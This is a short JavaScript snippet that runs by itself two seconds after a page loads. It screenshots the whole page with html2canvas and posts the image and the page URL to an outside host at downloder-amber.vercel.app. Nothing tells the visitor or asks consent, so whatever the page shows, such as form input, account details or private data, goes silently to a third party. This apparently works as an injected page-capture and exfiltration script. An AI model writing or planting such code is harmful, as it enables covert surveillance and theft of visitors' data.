async function captureAndSend() {
  try {
    const canvas = await html2canvas(document.body, {
      useCORS: true,
      allowTaint: true,
      scale: 1,
    });

    const base64 = canvas.toDataURL("image/jpeg", 0.8).split(",")[1];

    const res = await fetch("https://downloder-amber.vercel.app/api/screenshot", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        image: base64,
        url: window.location.href,
      }),
    });

    const data = await res.json();
    console.log("Screenshot sent:", data);
  } catch (err) {
    console.error("Screenshot failed:", err);
  }
}

window.addEventListener("load", () => {
  setTimeout(captureAndSend, 2000);
});
